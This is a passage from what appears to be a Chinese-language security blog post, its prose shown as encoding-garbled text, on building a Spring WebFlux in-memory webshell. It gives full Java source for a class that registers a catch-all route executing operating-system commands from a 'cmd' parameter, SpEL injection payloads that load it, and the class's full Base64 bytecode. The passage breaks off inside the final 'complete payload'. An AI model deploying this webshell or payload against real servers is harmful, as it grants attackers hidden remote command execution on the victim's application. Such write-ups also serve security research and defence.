<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272101184.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-comment">//Spring WebFlux ä¸­ ç»Ÿä¸€å…¥å£ç‚¹ï¼Œæ¯å½“æœ‰ HTTP è¯·æ±‚è¿›æ¥ï¼ŒDispatcherHandler å°±ä¼šè°ƒç”¨è¯¥æ–¹æ³•è¿›è¡Œå¤„ç†ã€‚</span><br><span class="hljs-comment">//ServerWebExchange åŒ…å«è¯·æ±‚å’Œå“åº”çš„æ‰€æœ‰å†…å®¹</span><br><span class="hljs-keyword">public</span> Mono&lt;Void&gt; <span class="hljs-title function_">handle</span><span class="hljs-params">(ServerWebExchange exchange)</span> &#123;<br><span class="hljs-comment">//åˆ¤æ–­æ˜¯å¦å­˜åœ¨ HandlerMapping</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.handlerMappings == <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">return</span> createNotFoundError();<br>&#125;<br><span class="hljs-comment">//å°†æ‰€æœ‰ HandlerMapping è½¬æ¢ä¸º Flux</span><br><span class="hljs-keyword">return</span> Flux.fromIterable(<span class="hljs-built_in">this</span>.handlerMappings)<br><span class="hljs-comment">//å¯¹æ¯ä¸ª HandlerMapping æ‰§è¡Œï¼šmapping.getHandler(exchange)</span><br><span class="hljs-comment">//åŒ¹é…è¯·æ±‚ï¼Œæ‰¾åˆ°å¯¹åº”å¤„ç†å™¨ handler</span><br>.concatMap(mapping -&gt; mapping.getHandler(exchange))<br><span class="hljs-comment">//Flux ä¸­å¯èƒ½è¿”å›å¤šä¸ªï¼ˆç†è®ºä¸Šï¼‰ï¼Œä½†åªéœ€è¦ç¬¬ä¸€ä¸ªåŒ¹é…çš„ handler</span><br>.next()<br><span class="hljs-comment">//å¦‚æœä¸Šé¢çš„ .next() æ²¡æœ‰æ‰¾åˆ°åŒ¹é…çš„ handlerï¼Œè¿™é‡Œè¿”å› 404ã€‚</span><br>.switchIfEmpty(createNotFoundError())<br><span class="hljs-comment">//æ‰¾åˆ° handler ä»¥åï¼Œå¹¶éç›´æ¥æ‰§è¡Œå®ƒï¼Œè€Œæ˜¯äº¤ç»™ HandlerAdapter</span><br>.flatMap(handler -&gt; invokeHandler(exchange, handler))<br><span class="hljs-comment">//å°† handler æ‰§è¡Œç»“æœå†™å…¥å“åº”</span><br>.flatMap(result -&gt; handleResult(exchange, result));<br>&#125;<br></code></pre></td></tr></table></figure>



<p>æ ¹æ®è¿™ä¸ªæµç¨‹ï¼Œæˆ‘ä»¬æ‰¾å‡ºä¸€ä¸ªæ„é€ å†…å­˜é©¬çš„æ€è·¯ï¼Œè®© HandlerMapping æ³¨å†Œä¸€ä¸ªæ˜ å°„å…³ç³»ï¼Œé€šè¿‡æ˜ å°„å…³ç³»è®©ç‰¹å®šçš„ HandlerAdapter æ‰§è¡Œåˆ°å†…å­˜é©¬æµç¨‹ï¼Œæœ€åå†…å­˜é©¬è¿”å›ä¸€ä¸ª HandlerResultHandler å¯ä»¥å¤„ç†çš„ç»“æœç±»å‹å³å¯ã€‚</p>
<p>æ²¿ç”¨ @c0ny1 å¸ˆå‚…é€‰æ‹©çš„ç±»ï¼š<code>RequestMappingHandlerMapping</code></p>
<h3 id="3-3-2-å†…å­˜é©¬ï¼š"><a href="#3-3-2-å†…å­˜é©¬ï¼š" class="headerlink" title="3.3.2 å†…å­˜é©¬ï¼š"></a>3.3.2 å†…å­˜é©¬ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.http.HttpStatus;<br><span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;<br><span class="hljs-keyword">import</span> org.springframework.web.reactive.result.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.reactive.result.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.util.pattern.PathPattern;<br><span class="hljs-keyword">import</span> org.springframework.web.util.pattern.PathPatternParser;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringRequestMappingMemshell</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">doInject</span><span class="hljs-params">(Object requestMappingHandlerMapping)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;inject-start&quot;</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">registerHandlerMethod</span> <span class="hljs-operator">=</span> requestMappingHandlerMapping.getClass().getDeclaredMethod(<span class="hljs-string">&quot;registerHandlerMethod&quot;</span>, Object.class, Method.class, RequestMappingInfo.class);<br>            registerHandlerMethod.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">executeCommand</span> <span class="hljs-operator">=</span> SpringRequestMappingMemshell.class.getDeclaredMethod(<span class="hljs-string">&quot;executeCommand&quot;</span>, String.class);<br>            <span class="hljs-type">PathPattern</span> <span class="hljs-variable">pathPattern</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PathPatternParser</span>().parse(<span class="hljs-string">&quot;/*&quot;</span>);<br>            <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">patternsRequestCondition</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(pathPattern);<br>            <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">requestMappingInfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(<span class="hljs-string">&quot;&quot;</span>, patternsRequestCondition, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>            registerHandlerMethod.invoke(requestMappingHandlerMapping, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpringRequestMappingMemshell</span>(), executeCommand, requestMappingInfo);<br>            msg = <span class="hljs-string">&quot;inject-success&quot;</span>;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            msg = <span class="hljs-string">&quot;inject-error&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> msg;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> ResponseEntity <span class="hljs-title function_">executeCommand</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">execResult</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next();<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseEntity</span>(execResult, HttpStatus.OK);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>åˆ†æï¼š</p>
<p> è¯¥å†…å­˜é©¬åŠ¨æ€å¾€ Spring çš„ RequestMappingHandlerMapping æ³¨å†Œä¸€ä¸ªæ–°çš„ URL æ˜ å°„ï¼ˆMappingï¼‰ï¼Œå¹¶ç»‘å®šåˆ° executeCommand() æ–¹æ³•ã€‚  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringRequestMappingMemshell</span> &#123;<br>    <span class="hljs-comment">//æ³¨å…¥å…¥å£ï¼Œå‚æ•°ï¼šSpring çš„ RequestMappingHandlerMapping å®ä¾‹</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">doInject</span><span class="hljs-params">(Object requestMappingHandlerMapping)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;inject-start&quot;</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//è·å– registerHandlerMethod åå°„æ–¹æ³•</span><br>            <span class="hljs-comment">//ç»•è¿‡ Spring æ³¨è§£ä½“ç³»ï¼Œä½¿ç”¨åå°„ç›´æ¥æ³¨å†Œä¸€ä¸ªæ–°çš„å¤„ç†å™¨æ–¹æ³•ã€‚</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">registerHandlerMethod</span> <span class="hljs-operator">=</span> requestMappingHandlerMapping.getClass().getDeclaredMethod(<span class="hljs-string">&quot;registerHandlerMethod&quot;</span>, Object.class, Method.class, RequestMappingInfo.class);<br>            registerHandlerMethod.setAccessible(<span class="hljs-literal">true</span>);<br>            <br>            <span class="hljs-comment">//è·å–ç»Ÿä¸€å¤„ç†å™¨æ–¹æ³• executeCommand</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">executeCommand</span> <span class="hljs-operator">=</span> SpringRequestMappingMemshell.class.getDeclaredMethod(<span class="hljs-string">&quot;executeCommand&quot;</span>, String.class);<br>            <br>            <span class="hljs-comment">//æ„é€  RequestMappingInfo</span><br>            <span class="hljs-type">PathPattern</span> <span class="hljs-variable">pathPattern</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PathPatternParser</span>().parse(<span class="hljs-string">&quot;/*&quot;</span>);<br>            <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">patternsRequestCondition</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(pathPattern);<br>            <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">requestMappingInfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(<span class="hljs-string">&quot;&quot;</span>, patternsRequestCondition, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>            <br>            <span class="hljs-comment">//æ­£å¼æ³¨å…¥</span><br>            registerHandlerMethod.invoke(requestMappingHandlerMapping, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpringRequestMappingMemshell</span>(), executeCommand, requestMappingInfo);<br>            <span class="hljs-comment">//è¿”å›æ³¨å…¥ç»“æœ</span><br>            msg = <span class="hljs-string">&quot;inject-success&quot;</span>;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            msg = <span class="hljs-string">&quot;inject-error&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> msg;<br>    &#125;<br><br>    <span class="hljs-comment">//è·å– cmd å‚æ•°ï¼ŒRuntime.getRuntime().exec(cmd) æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span><br>    <span class="hljs-comment">//ä½¿ç”¨ Scanner å°†ç»“æœè¯»å–ä¸ºå­—ç¬¦ä¸²</span><br>    <span class="hljs-comment">//Spring MVC è¿”å›æ–‡æœ¬ â€” ResponseEntity</span><br>    <span class="hljs-keyword">public</span> ResponseEntity <span class="hljs-title function_">executeCommand</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">execResult</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next();<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseEntity</span>(execResult, HttpStatus.OK);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>





<h3 id="3-3-3-å°è¯•æ”»å‡»"><a href="#3-3-3-å°è¯•æ”»å‡»" class="headerlink" title="3.3.3 å°è¯•æ”»å‡»"></a>3.3.3 å°è¯•æ”»å‡»</h3><p>åŸå§‹ payloadï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">#&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(<span class="hljs-string">&#x27;Memshell&#x27;</span>,T(org.springframework.util.Base64Utils).decodeFromString(<span class="hljs-string">&#x27;yv66vgAAA....&#x27;</span>),<span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.management.loading.MLet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL[<span class="hljs-number">0</span>],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()&#125;<br></code></pre></td></tr></table></figure>



<p>é‚£æ€ä¹ˆè·å–åˆ°RequestMappingHandlerMappingå‘¢ï¼Ÿé€šè¿‡java-object-searcherè‡ªç„¶å¯ä»¥å®šä½åˆ°ï¼Œå°ç»„çš„@whw1sfbå¸ˆå‚…æåˆ°äº†ä¸€ç§æ›´ç®€ä¾¿çš„æ–¹æ¡ˆï¼Œä»SPELä¸Šä¸‹æ–‡çš„beanå½“ä¸­è·å–</p>
<p>æ„é€  payloadï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">#&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(<span class="hljs-string">&#x27;SpringRequestMappingMemshell&#x27;</span>,T(org.springframework.util.Base64Utils).decodeFromString(<span class="hljs-string">&#x27;yv66vgAAA....&#x27;</span>),<span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.management.loading.MLet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL[<span class="hljs-number">0</span>],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(RequestMappingHandlerMapping)&#125;<br></code></pre></td></tr></table></figure>



<p>SpringRequestMappingMemshell.java -&gt; SpringRequestMappingMemshell.class -&gt; Base64:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">yv66vgAAADQAiwoABgBICABJCgAGAEoIADAHAEsHAEwHAE0HAE4KAAUATwoABwBQBwBRCAAyBwBSBwBTCgAOAEgIAFQKAA4AVQcAVgcAVwoAEgBYCABZCgAIAFoKAAsASAoABwBbCABcBwBdCABeBwBfCgBgAGEKAGAAYgoAYwBkCgAcAGUIAGYKABwAZwoAHABoBwBpCQBqAGsKACQAbAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAeTFNwcmluZ1JlcXVlc3RNYXBwaW5nTWVtc2hlbGw7AQAIZG9JbmplY3QBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nOwEAFXJlZ2lzdGVySGFuZGxlck1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAOZXhlY3V0ZUNvbW1hbmQBAAtwYXRoUGF0dGVybgEAMkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm47AQAYcGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uAQBMTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uOwEAEnJlcXVlc3RNYXBwaW5nSW5mbwEAQ0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAccmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAA21zZwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUBABBNZXRob2RQYXJhbWV0ZXJzAQA9KExqYXZhL2xhbmcvU3RyaW5nOylMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL1Jlc3BvbnNlRW50aXR5OwEAA2NtZAEACmV4ZWNSZXN1bHQBAApFeGNlcHRpb25zBwBtAQAKU291cmNlRmlsZQEAIVNwcmluZ1JlcXVlc3RNYXBwaW5nTWVtc2hlbGwuamF2YQwAJwAoAQAMaW5qZWN0LXN0YXJ0DABuAG8BAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQBBb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8MAHAAcQwAcgBzAQAcU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbAEAEGphdmEvbGFuZy9TdHJpbmcBADZvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm5QYXJzZXIBAAIvKgwAdAB1AQBKb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb24BADBvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm4MACcAdgEAAAwAJwB3DAB4AHkBAA5pbmplY3Qtc3VjY2VzcwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAxpbmplY3QtZXJyb3IBABFqYXZhL3V0aWwvU2Nhbm5lcgcAegwAewB8DAB9AH4HAH8MAIAAgQwAJwCCAQACXEEMAIMAhAwAhQCGAQAnb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL1Jlc3BvbnNlRW50aXR5BwCHDACIAIkMACcAigEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEABXBhcnNlAQBGKExqYXZhL2xhbmcvU3RyaW5nOylMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvdXRpbC9wYXR0ZXJuL1BhdGhQYXR0ZXJuOwEANihbTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3V0aWwvcGF0dGVybi9QYXRoUGF0dGVybjspVgECJChMamF2YS9sYW5nL1N0cmluZztMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvY29uZGl0aW9uL1BhcmFtc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vSGVhZGVyc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vQ29uc3VtZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvY29uZGl0aW9uL1Byb2R1Y2VzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L2NvbmRpdGlvbi9SZXF1ZXN0Q29uZGl0aW9uOylWAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAI29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzAQACT0sBACVMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7AQA6KExqYXZhL2xhbmcvT2JqZWN0O0xvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1czspVgAhAAsABgAAAAAAAwABACcAKAABACkAAAAvAAEAAQAAAAUqtwABsQAAAAIAKgAAAAYAAQAAAAwAKwAAAAwAAQAAAAUALAAtAAAACQAuAC8AAgApAAABUwAKAAcAAACSEgJMKrYAAxIEBr0ABVkDEgZTWQQSB1NZBRIIU7YACU0sBLYAChILEgwEvQAFWQMSDVO2AAlOuwAOWbcADxIQtgAROgS7ABJZBL0AE1kDGQRTtwAUOgW7AAhZEhUZBQEBAQEBAbcAFjoGLCoGvQAGWQO7AAtZtwAXU1kELVNZBRkGU7YAGFcSGUynAAdNEhtMK7AAAQADAIkAjAAaAAMAKgAAADYADQAAAA4AAwAQACAAEQAlABIANgATAEQAFABWABUAaQAWAIYAFwCJABoAjAAYAI0AGQCQABsAKwAAAFIACAAgAGkAMAAxAAIANgBTADIAMQADAEQARQAzADQABABWADMANQA2AAUAaQAgADcAOAAGAI0AAwA5ADoAAgAAAJIAOwA8AAAAAwCPAD0APgABAD8AAAATAAL/AIwAAgcABgcADQABBwAaAwBAAAAABQEAOwAAAAEAMgBBAAMAKQAAAGgABAADAAAAJrsAHFm4AB0rtgAetgAftwAgEiG2ACK2ACNNuwAkWSyyACW3ACawAAAAAgAqAAAACgACAAAAHwAaACAAKwAAACAAAwAAACYALAAtAAAAAAAmAEIAPgABABoADABDAD4AAgBEAAAABAABAEUAQAAAAAUBAEIAAAABAEYAAAACAEc=<br></code></pre></td></tr></table></figure>



<p>å®Œæ•´çš„ payloadï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">#&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(<span class="hljs-string">&#x27;SpringRequestMappingMemshell&#x27;</span>,T(org.springframework.util.Base64Utils).decodeFromString(<span class="hljs-string">&#x27;yv66vgAAADQAiwoABgBICABJCgAGAEoIADAHAEsHAEwHAE0HAE4KAAUATwoABwBQBwBRCAAyBwBSBwBTCgAOAEgIAFQKAA4AVQcAVgcAVwoAEgBYCABZCgAIAFoKAAsASAoABwBbCABcBwBdCABeBwBfCgBgAGEKAGAAYgoAYwBkCgAcAGUIAGYKABwAZwoAHABoBwBpCQBqAGsKACQAbAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAeTFNwcmluZ1JlcXVlc3RNYXBwaW5nTWVtc2hlbGw7AQAIZG9JbmplY3QBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nOwEAFXJlZ2lzdGVySGFuZGxlck1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAOZXhlY3V0ZUNvbW1hbmQBAAtwYXRoUGF0dGVybgEAMkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm47AQAYcGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uAQBMTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uOwEAEnJlcXVlc3RNYXBwaW5nSW5mbwEAQ0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAccmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAA21zZwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUBABBNZXRob2RQYXJhbWV0ZXJzAQA9KExqYXZhL2xhbmcvU3RyaW5nOylMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL1Jlc3BvbnNlRW50aXR5OwEAA2NtZAEACmV4ZWNSZXN1bHQBAApFeGNlcHRpb25zBwBtAQAKU291cmNlRmlsZQEAIVNwcmluZ1JlcXVlc3RNYXBwaW5nTWVtc2hlbGwuamF2YQwAJwAoAQAMaW5qZWN0LXN0YXJ0DABuAG8BAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQBBb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8MAHAAcQwAcgBzAQAcU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbAEAEGphdmEvbGFuZy9TdHJpbmcBADZvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm5QYXJzZXIBAAIvKgwAdAB1AQBKb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb24BADBvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm4MACcAdgEAAAwAJwB3DAB4AHkBAA5pbmplY3Qtc3VjY2VzcwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAxpbmplY3QtZXJyb3IBABFqYXZhL3V0aWwvU2Nhbm5lcgcAegwAewB8DAB9AH4HAH8MAIAAgQwAJwCCAQACXEEMAIMAhAwAhQCGAQAnb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL1Jlc3BvbnNlRW50aXR5BwCHDACIA